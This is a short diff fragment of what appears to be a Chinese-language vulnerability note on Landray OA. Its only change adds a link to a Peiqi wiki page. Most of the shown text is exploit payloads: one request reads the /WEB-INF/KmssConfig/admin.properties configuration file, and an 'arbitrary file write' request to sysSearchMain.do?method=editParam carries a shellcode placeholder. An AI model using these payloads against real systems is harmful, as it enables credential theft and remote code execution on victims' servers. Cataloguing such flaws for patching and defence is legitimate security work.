@@ -47,3 +47,5 @@ var={"body":{"file":"/WEB-INF/KmssConfig/admin.properties"}}
 0x04-任意文件写入漏洞
 
 var={"body":{"file":"/sys/search/sys_search_main/sysSearchMain.do?method=editParam"}}&fdParemNames=11&fdParameters=[shellcode]
+
+参考：http://wiki.peiqi.tech/wiki/oa/%E8%93%9D%E5%87%8COA/%E8%93%9D%E5%87%8COA%20custom.jsp%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.html
